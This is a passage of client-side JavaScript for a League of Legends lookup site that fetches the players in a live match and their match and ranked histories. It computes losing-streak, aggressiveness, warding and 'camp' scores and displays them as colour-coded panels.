// JavaScript Document

var champList;

var userUsername;
var userAccountId;
var userSummonerId;

var currentGame;
var stats;

var matchLists = [];
var matches = [];

var summonersUsername = [];
var summonersAccountId = [];
var summonersSummonerId = [];

var summonersChampIds = [];
var summonersMastery = [];
var summonersLeague = [];

//final data
var losingStreak = []; //losing streak
var masteryPoints = []; //champion mastery points
var winRate = []; //winrate in current ranked season
var wins = []; //wins in current ranked season
var losses = []; //losses in current ranked season
var timeSincePlayed = []; //time since champion was last played by the summoner in days
var aggressiveness = []; //score from 0 to 1 of a player's aggressiveness in lane
var warding = []; //score from 0 to 1 of a player's warding
var campScore = []; //score estimating how much a player should be camped



//set match history length per user (max 100)
var matchHistoryLength = 20;
var matchesLoaded = 0;


//async function list
var runList = [
	loadUser,
	timeComp,
	loadCurrentGame,
	timeComp,
	loadChampList,
	timeComp,
	loadSummoners,
	timeComp,
	loadMatchLists,
	timeComp,
	loadMatches,
	timeComp,
	loadStats,
	timeComp,
	loadMastery,
	timeComp,
	loadLeague,
	timeComp,
	processData,
	timeComp,
	loadDisplay,
	timeComp
];

var timeCompare = Date.now();

//run first async item
runList[0](runList, 0);

function timeComp(runList, index) {
	current = Date.now();
	console.log(current - timeCompare);
	timeCompare = Date.now();
	//run next async function
	if (runList[index + 1]) {
		runList[index + 1](runList, index + 1);
	}
}

//load administrator message
getAdminMsg().then(
	function success(data) {
		console.log(data);
		if (data != "" && getCookie("lastAdminMsg") != data) {
			console.log(document.getElementById("adminmsg").textContent);
			document.getElementById("adminmsgtext").textContent = data;
			document.getElementById("adminmsg").style.opacity = 1;
		} else {
			document.getElementById("adminmsg").style.display = "none";
		}
	},
	function fail(data) {
		console.log("failed to retrieve admin message");
		document.getElementById("adminmsg").style.display = "none";
	}
);

document.getElementById("adminmsgx").addEventListener("click", function(event) {
	document.getElementById("adminmsg").style.opacity = 0;
	document.getElementById("adminmsg").style.display = "none";
	setCookie("lastAdminMsg", document.getElementById("adminmsgtext").textContent, 30);
});

function getAdminMsg() {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			url: '/adminMsg',
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}



//gets parameter from current url
function getQuery(q) {
	return decodeURIComponent((window.location.search.match(new RegExp('[?&]' + q + '=([^&]+)')) || [, null])[1]);
}


document.getElementById("textfield").value = getQuery("username");

function getRegionID(theRegion) {
	var regions = ["NA", "EUW", "EUNE", "BR", "TR", "RU", "LAN", "LAS", "OCE", "KR", "JP"];
	var regionIDs = ["na1", "euw1", "eun1", "br1", "tr1", "ru", "la1", "la2", "oc1", "kr", "jp1"];
	return regionIDs[regions.indexOf(theRegion)];
}

function getRegion(theRegionID) {
	var regions = ["NA", "EUW", "EUNE", "BR", "TR", "RU", "LAN", "LAS", "OCE", "KR", "JP"];
	var regionIDs = ["na1", "euw1", "eun1", "br1", "tr1", "ru", "la1", "la2", "oc1", "kr", "jp1"];
	return regions[regionIDs.indexOf(theRegionID)];
}

var region = getRegion(getQuery("region"));

//region select button event listeners
var regionObjs = document.getElementsByClassName("region-button");
for (var i = 0; i < regionObjs.length; i++) {
	var regions = document.getElementById("region-select").getElementsByTagName("li");
	if (regions[i].textContent == region) {
		document.getElementById(regions[i].textContent).style.backgroundColor = "#111";
	} else {
		document.getElementById(regions[i].textContent).style.backgroundColor = "#333";
	}
	(function (index) {
		regionObjs[index].addEventListener("click", function () {
			region = this.textContent;
			setCookie('region', region, 30);
			console.log(getRegionID(region));
			var regions = document.getElementById("region-select").getElementsByTagName("li");
			for (var i = 0; i < regions.length; i++) {
				if (regions[i].textContent == region) {
					document.getElementById(regions[i].textContent).style.backgroundColor = "#111";
				} else {
					document.getElementById(regions[i].textContent).style.backgroundColor = "#333";
				}
			}
		});
	})(i);
}

function selectText(textField) {
	textField.focus();
	textField.select();
}

function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';
}

//Enter key handler for textbox
document.getElementById("textfield").addEventListener("keyup", function(event) {
    event.preventDefault();
    if (event.keyCode === 13) {
        document.getElementById("submit-button").click();
    }
});

document.getElementById("submit-button").addEventListener("click", function(event) {
	if (document.getElementById("textfield").value != "") {
		window.location.href = "tiltseek.html?username=" + document.getElementById("textfield").value + "&region=" + getRegionID(region);
	} else {
		document.getElementById("textfield").className = "textInputError";
		document.getElementById("submit-button").blur();
	}
});



function displayError(errorMsg) {
	document.getElementById("loader").style.display = "none";
	document.getElementById("lookup").style.display = "block";
	document.getElementById("logo").style.display = "block";
	document.getElementById("errorMsg").style.display = "block";
	document.getElementById("errorMsg").textContent = errorMsg;
	document.getElementById("errorMsg").textContent = errorMsg;
	document.getElementById("fadeIn").style.opacity = 1;
	document.getElementById("textfield").select();
}

function handleError(errorNum, message404) {
	if (errorNum == 400) {
		console.log("Bad request");
		displayError("Bad request. Either you did something weird or you found a bug. Maybe both.");
	} else if (errorNum == 429) {
		console.log("Rate limit exceeded");
		displayError("NOOOOO the dreaded Reddit hug of death. Rate limits have been exceeded. Check back in a few hours.");
	} else if (errorNum == 503) {
		console.log("Rito servers ded");
		displayError("Rito servers didn't respond. Looks like you're on your own this game.");
	} else if (errorNum == 404) {
		console.log("404");
		displayError(message404);
	} else if (errorNum == 778) {
		console.log("Invalid Region")
		displayError("A HUGE thank you to user Derpthemeus for helping me discover and patch this security flaw. Email bugs to contact@tiltseeker.com");
	} else {
		displayError("Oops... something happened. Error: " + errorNum);
	}
}



//Load the current user summoner name from the URL parameters
function loadUser(runList, index) {
	getUserInfoByName(getQuery("username")).then(
		function success(data) {
			userUsername = decodeURIComponent(data.name);
			userAccountId = data.accountId;
			userSummonerId = data.id;
			//run next async function
			if (runList[index + 1]) {
				runList[index + 1](runList, index + 1);
			}
		},
		function fail(data) {
			console.log("fail: " + data);
			handleError(data, "User not found. Check if the the region is correct.");
		}
	);
}

//Load the current game info for the summoner given in URL parameters
function loadCurrentGame(runList, index) {
	getCurrentGame(userSummonerId).then(
		function success(data) {
			currentGame = data;
			console.log(data);
			//run next async function
			if (runList[index + 1]) {
				runList[index + 1](runList, index + 1);
			}
		},
		function fail(data) {
			console.log("fail: " + data);
			handleError(data, "Player not in game. Check if the the region is correct.");
		}
	);
}

//Loads the static champ data from the server
function loadChampList(runList, index) {
	getChampList().then(
		function success(data) {
			champList = data;
			console.log(data);
			//run next async function
			if (runList[index + 1]) {
				runList[index + 1](runList, index + 1);
			}
		},
		function fail(data) {
			console.log("fail: " + data);
			handleError(data, "Servers under heavy load. Failed to load champion data.");
		}
	);
}

//Load the summoners in the current game
function loadSummoners(runList, index) {
	
	var totalLoaded = 0;
	
	for (let i = 0; i < currentGame.participants.length; i++) {
		getSummoners(currentGame.participants[i].summonerName).then(
			function success(data) {
				summonersUsername[i] = data.name;
				summonersAccountId[i] = data.accountId;
				summonersSummonerId[i] = data.id;
				totalLoaded++;
				percentDone = 10 * totalLoaded / summonersUsername.length;
				document.getElementById("loadingBar").style.width = percentDone + "%";
				//last one complete
				if (totalLoaded == currentGame.participants.length) {
					console.log(summonersUsername);
					if (runList[index + 1]) {
						runList[index + 1](runList, index + 1);
					}
				}
			},
			function fail(data) {
				console.log("fail: " + data);
				handleError(data, "Couldn't load the summoners in the current game. Looks like we still have bugs to squish.");
			}
		)
	}
	
//	getSummoners(currentGame.participants).then(
//		function success(data) {
//			//sort data properly
//			for (var j = 0; j < currentGame.participants.length; j++) {
//				for (var i = 0; i < data.length; i++) {
//					if (currentGame.participants[j].summonerName == data[i].name) {
//						summonersUsername.push(data[i].name);
//						summonersAccountId.push(data[i].accountId);
//						summonersSummonerId.push(data[i].id);
//						break;
//					}
//				}
//			}
//
//			//run next async function
//			if (runList[index + 1]) {
//				runList[index + 1](runList, index + 1);
//			}
//		},
//		function fail(data) {
//			console.log("fail: " + data);
//			handleError(data, "Couldn't load the summoners in the current game. Looks like we still have bugs to squish.");
//		}
//	);
}

//Load all the users matchlists
function loadMatchLists(runList, index) {
	
	var totalLoaded = 0;
	
	for (let i = 0; i < summonersAccountId.length; i++) {
		getMatchLists(summonersAccountId[i]).then(
			function success(data) {
				matchLists[i] = data.matches;
				totalLoaded++;
				percentDone = 10 + 10 * totalLoaded / summonersUsername.length;
					document.getElementById("loadingBar").style.width = percentDone + "%";
				//last one complete
				if (totalLoaded == summonersAccountId.length) {
					console.log(matchLists);
					if (runList[index + 1]) {
						runList[index + 1](runList, index + 1);
					}
				}
			},
			function fail(data) {
				console.log("fail: " + data);
				handleError(data, "Failed to load players' matchlists. Looks like you found a bug.");
			}
		);
	}
	
//	getMatchLists(summonersAccountId).then(
//		function success(data) {
//			for (var i = 0; i < data.length; i++) {
//				matchLists.push(data[i].matches);
//			}
//			console.log(matchLists);
//			//run next async function
//			if (runList[index + 1]) {
//				runList[index + 1](runList, index + 1);
//			}
//		},
//		function fail(data) {
//			console.log("fail: " + data);
//			handleError(data, "Failed to load players' matchlists. Looks like you found a bug.");
//		}
//	);
}

//Load all the users matches
function loadMatches(runList, index) {
	
	//intialize matches variable
	for (var i = 0; i < summonersAccountId.length; i++) {
		matches[i] = [];
	}
	for (var i = 0; i < summonersAccountId.length; i++) {
		for (var j = 0; j < matchHistoryLength; j++) {

		}
	}
	
	var totalLoaded = 0;
	var promises = [];
	
	for (let i = 0; i < summonersAccountId.length; i++) {
		for (let j = 0; j < matchHistoryLength && j < matchLists[i].length; j++) {
			promises.push(getMatch(matchLists[i][j].gameId).then(
				function success(data) {
					matches[i][j] = data;
					totalLoaded++;
					percentDone = 20 + 60 * totalLoaded / (summonersUsername.length * matchHistoryLength);
					document.getElementById("loadingBar").style.width = percentDone + "%";
				},
				function fail(data) {
					console.log("fail: " + data);
					handleError(data, "Failed to load players' historical matches. Looks like you found a bug!");
				}
			));
		}
	}
	
	Promise.all(promises).then(() => {
		if (runList[index + 1]) {
			runList[index + 1](runList, index + 1);
		}
	});
	
	//loop through all users and their matches
//	var i = 0;
//	var j = 0;
//	myLoop(runList, index);
//	function myLoop(runList, index) {
//		console.log(i + "   " + j);
//		getMatch(matchLists[i][j].gameId).then(
//			function success(data) {
//				matchesLoaded++;
//				percentDone = 100 * matchesLoaded / (summonersUsername.length * matchHistoryLength);
//				document.getElementById("loadingBar").style.width = percentDone + "%";
//				matches[i].push(data);
//				if (j < matchHistoryLength - 1) {
//					j++;
//					if (matchLists[i][j]) {
//						myLoop(runList, index);
//					} else {
//						matchesLoaded += (matchHistoryLength - j);
//						i++;
//						j = 0;
//						myLoop(runList, index);
//					}
//				} else if (i < matchLists.length - 1 && j >= matchHistoryLength - 1) {
//					i++;
//					j = 0;
//					myLoop(runList, index);
//				} else if (i >= matchLists.length - 1 && j >= matchHistoryLength - 1) {
//					console.log(matches);
//					//run next async function
//					if (runList[index + 1]) {
//						runList[index + 1](runList, index + 1);
//					}
//				}
//			},
//			function fail(data) {
//				console.log("fail: " + data);
//				handleError(data, "Failed to load players' historical matches. Looks like you found a bug!");
//			}
//		);
//	}
}

//Load stats data for champs in current game and historical matches
function loadStats(runList, index) {
	var champIds = [];
	//current game
	for (var i = 0; i < currentGame.participants.length; i++) {
		if (champIds.indexOf(currentGame.participants[i].championId) == -1) {
			champIds.push(currentGame.participants[i].championId);
		}
	}
	//historical matches
	for (var i = 0; i < matches.length; i++) {
		for (var j = 0; j < matches[i].length; j++) {
			var participant = 0;
			for (var k = 0; k < matches[i][j].participantIdentities.length; k++) {
				if (summonersSummonerId[i] == matches[i][j].participantIdentities[k].player.summonerId) {
					participant = k;
					break;
				}
			}
			if (champIds.indexOf(matches[i][j].participants[participant].championId) == -1) {
				champIds.push(matches[i][j].participants[participant].championId);
			}
		}
	}
	console.log(champIds);
	getStats(champIds).then(
		function success(data) {
			console.log(data);
			stats = data;
			//run next async function
			if (runList[index + 1]) {
				runList[index + 1](runList, index + 1);
			}
		},
		function fail(data) {
			console.log("fail: " + data);
			handleError(data, "Servers seem to be under heavy load. Please wait a few minutes.");
		}
	);
}

//Load champion masteries for summoner's current champions
function loadMastery(runList, index) {
	for (var i = 0; i < currentGame.participants.length; i++) {
		summonersChampIds.push(currentGame.participants[i].championId);
	}
	
	var totalLoaded = 0;
	
	for (let i = 0; i < summonersSummonerId.length; i++) {
		getMastery(summonersSummonerId[i],summonersChampIds[i]).then(
			function success(data) {
				summonersMastery[i] = data;
				totalLoaded++;
				percentDone = 80 + 10 * totalLoaded / summonersUsername.length;
				document.getElementById("loadingBar").style.width = percentDone + "%";
				//last one complete
				if (totalLoaded == summonersSummonerId.length) {
					console.log(summonersMastery);
					if (runList[index + 1]) {
						runList[index + 1](runList, index + 1);
					}
				}
			},
			function fail(data) {
				console.log("fail: " + data);
				handleError(data, "Failed to load players' champion masteries. Looks like you found a bug!");
			}
		);
	}
	
//	getMastery(summonersSummonerId,summonersChampIds).then(
//		function success(data) {
//			console.log(data);
//			summonersMastery = data;
//
//			//run next async function
//			if (runList[index + 1]) {
//				runList[index + 1](runList, index + 1);
//			}
//		},
//		function fail(data) {
//			console.log("fail: " + data);
//			handleError(data, "Failed to load players' champion masteries. Looks like you found a bug!");
//		}
//	);
}

//Load summoner ranked league stats
function loadLeague(runList, index) {
	
	var totalLoaded = 0;
	
	for (let i = 0; i < summonersSummonerId.length; i++) {
		getLeague(summonersSummonerId[i]).then(
			function success(data) {
				summonersLeague[i] = data;
				totalLoaded++;
				percentDone = 90 + 10 * totalLoaded / summonersUsername.length;
				document.getElementById("loadingBar").style.width = percentDone + "%";
				//last one complete
				if (totalLoaded == summonersSummonerId.length) {
					console.log(summonersLeague);
					if (runList[index + 1]) {
						runList[index + 1](runList, index + 1);
					}
				}
			},
			function fail(data) {
				console.log("fail: " + data);
				handleError(data, "Failed to load players' ranked data. Looks like you found a bug!");
			}
		);
	}
	
//	getLeague(summonersSummonerId).then(
//		function success(data) {
//			console.log(data);
//			
//			summonersLeague = data;
//
//			//run next async function
//			if (runList[index + 1]) {
//				runList[index + 1](runList, index + 1);
//			}
//		},
//		function fail(data) {
//			console.log("fail: " + data);
//			handleError(data, "Failed to load players' ranked data. Looks like you found a bug!");
//		}
//	);
}

//Process all the data that has been collected
function processData(runList, index) {
	
//+losing streak
//+champion mastery points
//+winrate
//+played champ recently
//+aggressive laner
//+good warder
//+gets first tower
//+champion's mobility (might have to hard code numbers)
	
	//set participants in matchlists
	for (var i = 0; i < matches.length; i++) {
		for (var j = 0; j < matches[i].length; j++) {
			for (var k = 0; k < matches[i][j].participantIdentities.length; k++) {
				if (summonersSummonerId[i] == matches[i][j].participantIdentities[k].player.summonerId) {
					//set participant for future use to improve speed
					matches[i][j]['myParticipant'] = k;
					break;
				}
			}
		}
	}
	
	//calculate losingStreak
	for (var i = 0; i < matches.length; i++) {
		losingStreak.push(0);
		var compareTime = (new Date).getTime();
		for (var j = 0; j < matches[i].length; j++) {
			//check if previous match was greater than 3 hours ago
			if (compareTime - matches[i][j].gameCreation > 10800000) {
				break;
			}
			
			//find the participant
			var participant = matches[i][j].myParticipant;
			if (matches[i][j].participants[participant].stats.win == true) {
				break;
			}
			compareTime = matches[i][j].gameCreation;
			losingStreak[i]++;
		}
	}
	
	//set up masteryPoints
	for (var i = 0; i < summonersMastery.length; i++) {
		masteryPoints.push(summonersMastery[i].championPoints);
		//set mastery to 0 if no mastery is found
		if (isNaN(masteryPoints[i])) { masteryPoints[i] = 0;}
	}
	
	//calculate wins, losses, and winRate ("not enough games" for summoners with low games)
	for (var i = 0; i < summonersLeague.length; i++) {
		if (summonersLeague[i][0]) {
			wins.push(summonersLeague[i][0].wins);
			losses.push(summonersLeague[i][0].losses);
		} else {
			wins.push(0);
			losses.push(0);
		}
		if (wins[i] + losses[i] >= 30) {
			winRate.push(wins[i]/(wins[i]+losses[i]));
		} else {
			winRate.push("not enough games");
		}
	}
	
	//calculate timeSincePlayed
	for (var i = 0; i < summonersMastery.length; i++) {
		if (isNaN(summonersMastery[i].lastPlayTime)) {
			timeSincePlayed.push("Never played");
		} else {
			timeSincePlayed.push(((new Date).getTime()-summonersMastery[i].lastPlayTime)/(1000*60*60*24));
		}
		//set timeSincePlayed to 10000 if no mastery is found
		if (isNaN(timeSincePlayed[i])) { timeSincePlayed[i] = 10000;}
	}
	//calculate aggressiveness
	for (var i = 0; i < matches.length; i++) {
		var totalPlayerInteraction = 0; //total player kills + deaths + assists in game history
		var totalAvgInteraction = 0; //total average kills + deaths + assists for champs played
		for (var j = 0; j < matches[i].length; j++) {
			
			var interaction = 0; //Kills + Deaths + Assists
			var avgInteraction = 0;
			
			//find the participant
			var participant = matches[i][j].myParticipant;
			//the player
			interaction += matches[i][j].participants[participant].stats.kills;
			interaction += matches[i][j].participants[participant].stats.deaths;
			interaction += matches[i][j].participants[participant].stats.assists;
			//champion average
			avgInteraction += stats[matches[i][j].participants[participant].championId].kills/stats[matches[i][j].participants[participant].championId].total;
			avgInteraction += stats[matches[i][j].participants[participant].championId].deaths/stats[matches[i][j].participants[participant].championId].total;;
			avgInteraction += stats[matches[i][j].participants[participant].championId].assists/stats[matches[i][j].participants[participant].championId].total;;
			//add to total
			totalPlayerInteraction += interaction;
			totalAvgInteraction += avgInteraction;
		}
		
		function sigmoid(t) {
			//the 10 is a constant that adjusts how sensitive the function is. The higher it is, the less sensitive it is
			return 1/(1+Math.pow(Math.E, -t/10));
		}
		aggressiveness.push(sigmoid((totalPlayerInteraction-totalAvgInteraction)/matches[i].length));
	}
	
	//calculate warding
	for (var i = 0; i < matches.length; i++) {
		var totalPlayerWards = 0; //total player kills + deaths + assists in game history
		var totalAvgWards = 0; //total average kills + deaths + assists for champs played
		for (var j = 0; j < matches[i].length; j++) {
			
			var wards = 0; //Kills + Deaths + Assists
			var avgWards = 0;
			
			//find the participant
			var participant = matches[i][j].myParticipant;
			//the player
			if (matches[i][j].participants[participant].stats.wardsPlaced) {
				wards += matches[i][j].participants[participant].stats.wardsPlaced;
			} else {
				continue;
			}
			//champion average
			avgWards += stats[matches[i][j].participants[participant].championId].wardsPlaced/stats[matches[i][j].participants[participant].championId].total;
			//add to total
			totalPlayerWards += wards;
			totalAvgWards += avgWards;
		}
		
		function sigmoid(t) {
			//the 10 is a constant that adjusts how sensitive the function is. The higher it is, the less sensitive it is
			return 1/(1+Math.pow(Math.E, -t/10));
		}
		warding.push(sigmoid((totalPlayerWards-totalAvgWards)/matches[i].length));
	}
	
	//calculate campScore
	for (var i = 0; i < summonersUsername.length; i++) {
		
		//set campScore from 50 to 100 based on losing streak run through sigmoid
		campScore.push(100*sigmoid(losingStreak[i],1));
		
		//multiply campScore by champSkillEvaluation
		campScore[i] = campScore[i] * champSkillEvaluation(timeSincePlayed[i],masteryPoints[i]);
		
		//multiply campScore by winRateMultiplier
		if (!isNaN(winRate[i])) {
			campScore[i] = campScore[i] * winRateMultiplier(winRate[i]);
		} else {
			//if no winrate data assume 50%
			campScore[i] = campScore[i] * winRateMultiplier(0.5);
		}
		
		//set campScore to text if data couldn't be calculated
		if (isNaN(campScore[i])) {
			campScore[i] = "Not Enough Data";
		}
		
		//a function to get a multiplier from winrate
		//uses winrate (x)
		//function to insert into desmos.com y=1-\frac{0.5}{1+e^{-30\left(x-0.45\right)}}
		function winRateMultiplier(x) {
			return 1-0.5/(1+Math.pow(Math.E, -30*(x-0.45)));
		}
		
		//a function to estimate skill on a champion from 0.6 to 1
		//uses time since last played (x) and champion mastery (z)
		//function to insert into desmos.com y=1-.4e^{\frac{-x}{50}}\left(1-0.9e^{-\frac{z}{50000}}\right)
		function champSkillEvaluation(x,z) {
			return 1-0.4*Math.pow(Math.E, -x/50)*(1-0.9*Math.pow(Math.E, -z/50000));
		}
		
		function sigmoid(t,sensitivity) {
			//the sensitivity adjusts how sensitive the function is. The higher it is, the less sensitive it is
			return 1/(1+Math.pow(Math.E, -t/sensitivity));
		}
	}
	
	console.log(campScore);
	console.log(warding);
	console.log(aggressiveness);
	console.log(timeSincePlayed);
	console.log(winRate);
	console.log(masteryPoints);
	
	for (var i = 0; i < summonersUsername.length; i++) {
		console.log(summonersUsername[i] + ":\t" + champList.data[champIdToKey(currentGame.participants[i].championId)].name + ":\t" + campScore[i])
	}
	
	//run next async function
	if (runList[index + 1]) {
		runList[index + 1](runList, index + 1);
	}
}

function champIdToKey(theId) {
	var objKeys = Object.keys(champList.data);
	for (var i = 0; i < objKeys.length; i++) {
		if (champList.data[objKeys[i]].key == theId) {
			return champList.data[objKeys[i]].id;
		}
	}
	return null;
}

//Display everything
function loadDisplay(runList, index) {
	
	function getRed(myNum) {
		if (myNum < 0.5) {
			return 255;
		} else {
			return Math.max(0, 2*(1-myNum)*255);
		}
	}
	
	function getGreen(myNum) {
		if (myNum > 0.5) {
			return 255;
		} else {
			return Math.max(0, 2*myNum*255);
		}
	}
	
	//y=1-\frac{1}{e^{0.7x}}
	function losingStreakSigmoid(x) {
		return 1-1/Math.pow(Math.E, 0.7*x);
	}
	
	//y=1-\frac{1}{1+e^{25\left(0.5-x\right)}}
	function winRateSigmoid(x) {
		return 1-1/(1+Math.pow(Math.E, 25*(0.5-x)));
	}
	
	//y=\frac{1}{e^{\frac{x}{100000}}}
	function masterySigmoid(x) {
		return 1/Math.pow(Math.E, x/100000);
	}
	
	//y=1-\frac{1}{e^{\frac{x}{25}^{.5}}}
	function daysSincePlayedSigmoid(x) {
		return 1-1/Math.pow(Math.E, Math.pow(x/25,0.5));
	}
	
	//y=\frac{1}{1+e^{10\left(0.5-x\right)}}
	function aggrSigmoid(x) {
		return 1/(1+Math.pow(Math.E, 10*(0.5-x)));
	}
	
	//y=1-\frac{1}{1+e^{10\left(0.5-x\right)}}
	function wardSigmoid(x) {
		return 1-1/(1+Math.pow(Math.E, 10*(0.5-x)));
	}
	
	//y=\frac{1}{1+e^{\frac{\left(30-x\right)}{10}}}
	function campScoreSigmoid(x) {
		return 1/(1+Math.pow(Math.E, (30-x)/10));
	}
	
	//make loader disappear
	document.getElementById("loader").style.display = "none";
	document.getElementById("teamName1").style.display = "block";
	document.getElementById("teamName2").style.display = "block";
	
	
	//set damage bars
	
	//First team bar
	var magicDmg = 0;
	var physicalDmg = 0;
	var trueDmg = 0;
	for (var i = 0; i < summonersChampIds.length/2; i++) {
		magicDmg += stats[summonersChampIds[i]].magicDamage;
		physicalDmg += stats[summonersChampIds[i]].physicalDamage;
		trueDmg += stats[summonersChampIds[i]].trueDamage;
	}
	var totalDmg = magicDmg + physicalDmg + trueDmg;
	var temp = document.getElementsByTagName("template")[1].content.querySelector("div");
	var a = document.importNode(temp, true);
	a.querySelectorAll("div")[0].style.width = 100*magicDmg/totalDmg + "%";
	a.querySelectorAll("div")[1].style.width = 100*physicalDmg/totalDmg + "%";
	a.querySelectorAll("div")[2].style.width = 100*trueDmg/totalDmg + "%";
	a.querySelectorAll("span")[1].textContent = "Magic: " + Math.round(1000*magicDmg/totalDmg)/10 + "%" + "\r\n" + "Physical: " + Math.round(1000*physicalDmg/totalDmg)/10 + "%" + "\r\n" + "True: " + Math.round(1000*trueDmg/totalDmg)/10 + "%";
	document.getElementById("damageBar1").appendChild(a);
	
	//Second team bar
	var magicDmg = 0;
	var physicalDmg = 0;
	var trueDmg = 0;
	for (var i = summonersChampIds.length/2; i < summonersChampIds.length; i++) {
		magicDmg += stats[summonersChampIds[i]].magicDamage;
		physicalDmg += stats[summonersChampIds[i]].physicalDamage;
		trueDmg += stats[summonersChampIds[i]].trueDamage;
	}
	var totalDmg = magicDmg + physicalDmg + trueDmg;
	var temp = document.getElementsByTagName("template")[1].content.querySelector("div");
	var a = document.importNode(temp, true);
	a.querySelectorAll("div")[0].style.width = 100*magicDmg/totalDmg + "%";
	a.querySelectorAll("div")[1].style.width = 100*physicalDmg/totalDmg + "%";
	a.querySelectorAll("div")[2].style.width = 100*trueDmg/totalDmg + "%";
	a.querySelectorAll("span")[1].textContent = "Magic: " + Math.round(1000*magicDmg/totalDmg)/10 + "%" + "\r\n" + "Physical: " + Math.round(1000*physicalDmg/totalDmg)/10 + "%" + "\r\n" + "True: " + Math.round(1000*trueDmg/totalDmg)/10 + "%";
	document.getElementById("damageBar2").appendChild(a);
	
	function loadChampDisplay(theElement, playerNum) {
		var temp = document.getElementsByTagName("template")[0].content.querySelector("div");
		var a = document.importNode(temp, true);
		//picture
		a.querySelectorAll("img")[0].src = "https://ddragon.leagueoflegends.com/cdn/8.15.1/img/champion/" + champIdToKey(summonersChampIds[playerNum]) + ".png";
		//username
		a.querySelectorAll("div")[0].textContent = summonersUsername[playerNum];
		//make font smaller if username is long
		
		//losingStreak
		a.querySelectorAll("div")[2].textContent = losingStreak[playerNum];
		a.querySelectorAll("div")[2].style.color = "rgb(" + getRed(losingStreakSigmoid(losingStreak[playerNum])) + "," + getGreen(losingStreakSigmoid(losingStreak[playerNum])) + ",0)";
		a.querySelectorAll("div")[2].style.fontWeight = "300";
		
		//winrate
		a.querySelectorAll("div")[4].style.whiteSpace = "pre"
		a.querySelectorAll("div")[4].textContent = Math.round(10000*winRate[playerNum])/100 + "% \r\n" + wins[playerNum] + "W/" + losses[playerNum] + "L";
		a.querySelectorAll("div")[4].style.color = "rgb(" + getRed(winRateSigmoid(winRate[playerNum])) + "," + getGreen(winRateSigmoid(winRate[playerNum])) + ",0)";
		a.querySelectorAll("div")[4].style.fontWeight = "300";
		if (isNaN(winRate[playerNum])) {
			a.querySelectorAll("div")[4].textContent = "Not Enough \r\n Games";
			a.querySelectorAll("div")[4].style.color = "#b2b2b2";
		}
		//mastery
		a.querySelectorAll("div")[6].textContent = masteryPoints[playerNum];
		a.querySelectorAll("div")[6].style.color = "rgb(" + getRed(masterySigmoid(masteryPoints[playerNum])) + "," + getGreen(masterySigmoid(masteryPoints[playerNum])) + ",0)";
		a.querySelectorAll("div")[6].style.fontWeight = "300";
		
		//daysSincePlayed
		a.querySelectorAll("div")[8].textContent = Math.round(timeSincePlayed[playerNum]) + " days ago";
		a.querySelectorAll("div")[8].style.color = "rgb(" + getRed(daysSincePlayedSigmoid(timeSincePlayed[playerNum])) + "," + getGreen(daysSincePlayedSigmoid(timeSincePlayed[playerNum])) + ",0)";
		a.querySelectorAll("div")[8].style.fontWeight = "300";
		if (timeSincePlayed[playerNum] == 10000) {
			a.querySelectorAll("div")[8].textContent = "Never Played";
		}
		
		//agr
		a.querySelectorAll("div")[10].textContent = Math.round(100*aggressiveness[playerNum]) + "%";
		a.querySelectorAll("div")[10].style.color = "rgb(" + getRed(aggrSigmoid(aggressiveness[playerNum])) + "," + getGreen(aggrSigmoid(aggressiveness[playerNum])) + ",0)";
		a.querySelectorAll("div")[10].style.fontWeight = "300";
		
		//warding
		a.querySelectorAll("div")[12].textContent = Math.round(100*warding[playerNum]) + "%";
		a.querySelectorAll("div")[12].style.color = "rgb(" + getRed(wardSigmoid(warding[playerNum])) + "," + getGreen(wardSigmoid(warding[playerNum])) + ",0)";
		a.querySelectorAll("div")[12].style.fontWeight = "300";
		
		//campScore
		a.querySelectorAll("div")[14].textContent = Math.round(campScore[playerNum]);
		a.querySelectorAll("div")[14].style.color = "rgb(" + getRed(campScoreSigmoid(campScore[playerNum])) + "," + getGreen(campScoreSigmoid(campScore[playerNum])) + ",0)";
		if (isNaN(campScore[playerNum])) {
			a.querySelectorAll("div")[14].textContent = "X";
		}

		document.getElementById(theElement).appendChild(a);
	}
	
	var sortedOrder = [];
	sortByTiltScore();
	function sortByTiltScore() {
		var campScoreTeam1 = campScore.slice(0, campScore.length / 2);
		campScoreTeam1.sort(function (a, b) {
			return b - a;
		});
		console.log(campScoreTeam1);
		var maxScore = 0;
		for (var i = 0; i < campScoreTeam1.length; i++) {
			sortedOrder.push(campScore.indexOf(campScoreTeam1[i]));
		}
		var campScoreTeam2 = campScore.slice(campScore.length / 2, campScore.length);
		campScoreTeam2.sort(function (a, b) {
			return b - a;
		});
		console.log(campScoreTeam2);
		var maxScore = 0;
		for (var i = 0; i < campScoreTeam2.length; i++) {
			sortedOrder.push(campScore.indexOf(campScoreTeam2[i]));
		}
		console.log(sortedOrder);
	}
	
	for (var i = 0; i < currentGame.participants.length/2; i++) {
		loadChampDisplay("displayBox", sortedOrder[i]);
	}
	
	for (var i = currentGame.participants.length/2; i < currentGame.participants.length; i++) {
		loadChampDisplay("displayBox2", sortedOrder[i]);
	}
	
	
	
	//set visible
	document.getElementById("fadeIn").style.opacity = 1;

}


//Load champion list
function getChampList(asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/getChampList',
			data: {
				"region": getQuery("region")
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}

//Load summoner info by summoner name
function getUserInfoByName(theUsername, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		console.log(theUsername);
		$.ajax({
			async: asynch,
			url: '/summonerByName',
			data: {
				"username": theUsername,
				"region": getQuery("region")
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
